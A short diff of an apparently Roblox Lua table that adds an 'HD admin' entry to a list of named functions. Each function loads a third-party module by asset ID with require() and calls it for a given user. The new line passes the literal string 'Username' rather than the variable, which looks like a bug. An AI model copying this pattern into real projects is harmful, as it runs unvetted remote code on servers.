@@ -1,5 +1,11 @@
 return {
     {
+        Name = "HD admin",
+        Function = function(Username)
+        require(7192763922).load("Username")
+        end
+    },
+    {
         Name = "Gojo",
         Function = function(Username)
             require(103408394508146).unlimited(Username)
